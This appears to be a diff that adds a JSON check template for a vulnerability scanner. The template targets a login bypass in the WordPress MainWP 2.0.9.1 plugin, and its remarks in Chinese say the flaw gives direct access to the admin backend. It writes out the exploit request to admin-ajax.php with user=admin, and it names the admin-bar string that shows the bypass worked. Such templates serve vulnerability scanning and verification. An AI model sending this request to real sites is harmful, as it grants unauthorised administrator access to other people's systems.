@@ -1,0 +1,23 @@
+{
+    "target":"wordpress",
+    "meta":{
+        "name":    "WordPress MainWP 2.0.9.1 登录绕过",
+        "remarks": "WordPress MainWP 2.0.9.1 存在登录绕过漏洞，可直接登录管理后台",
+        "level":   1,
+        "type":    "逻辑漏洞",
+        "author":   "wolf",
+        "references": {
+            "url":"",
+            "cve":"",
+            "kpid":"KP-0071"
+        }
+    },
+    "request":{
+        "path":     "/wp-admin/admin-ajax.php?action=init&login_required=1&user=admin",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": "<div id='wpadminbar'"
+    }
+}
